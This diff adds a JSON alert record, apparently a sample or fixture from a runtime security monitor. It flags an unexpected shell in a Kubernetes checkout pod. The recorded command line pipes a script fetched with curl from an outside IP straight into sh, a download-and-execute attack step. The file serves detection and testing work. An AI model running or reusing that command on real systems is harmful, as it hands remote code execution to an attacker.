@@ -1,0 +1,20 @@
+{
+  "uuid": "6f1c2a9e-4b7d-4d1e-9a51-2c0e7f3b8a10",
+  "time": "2026-10-28T14:02:40.512345678Z",
+  "rule": "Unexpected Process in Protected Workload",
+  "priority": "Warning",
+  "source": "syscall",
+  "hostname": "ip-10-20-3-41.eu-west-1.compute.internal",
+  "output": "Unexpected process in protected workload (proc=sh cmdline=sh -c curl -s http://198.51.100.23/x.sh | sh user=node pod=checkout-7d9f6c-x2k8p ns=shop image=123456789012.dkr.ecr.eu-west-1.amazonaws.com/shop/checkout)",
+  "output_fields": {
+    "proc.name": "sh",
+    "proc.cmdline": "sh -c curl -s http://198.51.100.23/x.sh | sh",
+    "user.name": "node",
+    "k8s.ns.name": "shop",
+    "k8s.pod.name": "checkout-7d9f6c-x2k8p",
+    "k8s.pod.uid": "8b0e3c52-1d7a-4f43-9e6b-3a2c5d9f0e17",
+    "container.id": "3b0f9a1c2d4e",
+    "container.image.repository": "123456789012.dkr.ecr.eu-west-1.amazonaws.com/shop/checkout"
+  },
+  "tags": ["cloudshield", "mitre_execution", "T1059"]
+}
